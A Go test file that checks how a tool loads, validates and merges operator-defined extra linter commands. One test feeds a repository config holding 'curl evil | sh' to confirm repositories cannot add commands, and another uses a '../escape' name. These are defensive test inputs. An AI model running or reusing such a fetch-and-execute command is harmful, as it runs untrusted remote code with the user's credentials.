package config

import (
	"strings"
	"testing"
)

func TestLoadGlobal_ExtraLintersResolveWithDefaults(t *testing.T) {
	t.Parallel()
	cfg, err := LoadGlobalFromBytes([]byte(`
lint:
  extra_linters:
    - name: personal-dotnet
      command: "  ~/.config/coding-standards/lint-changed-dotnet.sh --since \"$NO_MISTAKES_BASE_SHA\"  "
      findings_pattern: ': warning (TVRM|FAA)[0-9]+'
    - name: personal-go
      command: lint-changed-go.sh
      findings_pattern: ': warning'
      severity: warning
`))
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Lint.ExtraLinters) != 2 {
		t.Fatalf("expected 2 extra linters, got %d", len(cfg.Lint.ExtraLinters))
	}
	first := cfg.Lint.ExtraLinters[0]
	if strings.HasPrefix(first.EffectiveCommand(), " ") || strings.HasSuffix(first.EffectiveCommand(), " ") {
		t.Errorf("expected the command to be read trimmed, got %q", first.EffectiveCommand())
	}
	if first.EffectiveSeverity() != DefaultExtraLinterSeverity {
		t.Errorf("expected an unset severity to default to %q, got %q", DefaultExtraLinterSeverity, first.EffectiveSeverity())
	}
	if cfg.Lint.ExtraLinters[1].EffectiveSeverity() != "warning" {
		t.Errorf("expected the declared severity to survive, got %q", cfg.Lint.ExtraLinters[1].EffectiveSeverity())
	}
}

func TestLoadGlobal_ExtraLinterRejectsBadEntries(t *testing.T) {
	t.Parallel()
	cases := map[string]struct {
		yaml string
		want string
	}{
		"missing name": {
			yaml: "lint:\n  extra_linters:\n    - command: run-it\n",
			want: "name must not be empty",
		},
		"unsafe name": {
			yaml: "lint:\n  extra_linters:\n    - name: \"../escape\"\n      command: run-it\n",
			want: "must start with a letter or digit",
		},
		"duplicate name": {
			yaml: "lint:\n  extra_linters:\n    - name: a\n      command: x\n      findings_pattern: 'x'\n    - name: a\n      command: y\n      findings_pattern: 'y'\n",
			want: `duplicate name "a"`,
		},
		"missing command": {
			yaml: "lint:\n  extra_linters:\n    - name: a\n      command: \"   \"\n",
			want: "command must not be empty",
		},
		// A linter with no pattern exits 0 carrying its findings and reports
		// nothing, which is the silent-clean outcome the list exists to end.
		"missing pattern": {
			yaml: "lint:\n  extra_linters:\n    - name: a\n      command: x\n",
			want: "findings_pattern must not be empty",
		},
		"uncompilable pattern": {
			yaml: "lint:\n  extra_linters:\n    - name: a\n      command: x\n      findings_pattern: '([unclosed'\n",
			want: "findings_pattern does not compile",
		},
		"unknown severity": {
			yaml: "lint:\n  extra_linters:\n    - name: a\n      command: x\n      findings_pattern: 'x'\n      severity: fatal\n",
			want: `severity "fatal" must be one of`,
		},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			_, err := LoadGlobalFromBytes([]byte(tc.yaml))
			if err == nil {
				t.Fatalf("expected %s to be rejected", name)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("expected error to contain %q, got %v", tc.want, err)
			}
		})
	}
}

// The list runs commands with the operator's credentials and no repository
// declares it, so there is no trusted repository position for it to come from
// (see ExtraLinter). RepoConfig has no lint field at all, and repo config
// parsing is deliberately lenient about keys it does not know, so a repository
// declaring one parses and contributes nothing.
func TestRepoConfigCannotDeclareExtraLinters(t *testing.T) {
	t.Parallel()
	repo, err := LoadRepoFromBytes([]byte("lint:\n  extra_linters:\n    - name: sneaky\n      command: curl evil | sh\n"))
	if err != nil {
		t.Fatal(err)
	}
	merged := Merge(DefaultGlobalConfig(), repo)
	if len(merged.Lint.ExtraLinters) != 0 {
		t.Fatalf("a repository must not be able to add an extra linter, got %+v", merged.Lint.ExtraLinters)
	}
}

// Merge copies the operator's list straight through: no repository input takes
// part in resolving it.
func TestMerge_ExtraLintersComeFromGlobalOnly(t *testing.T) {
	t.Parallel()
	global := DefaultGlobalConfig()
	global.Lint = Lint{ExtraLinters: []ExtraLinter{{Name: "personal-go", Command: "x"}}}
	merged := Merge(global, &RepoConfig{})
	if len(merged.Lint.ExtraLinters) != 1 || merged.Lint.ExtraLinters[0].Name != "personal-go" {
		t.Fatalf("expected the global extra linters to reach the merged config, got %+v", merged.Lint)
	}
}
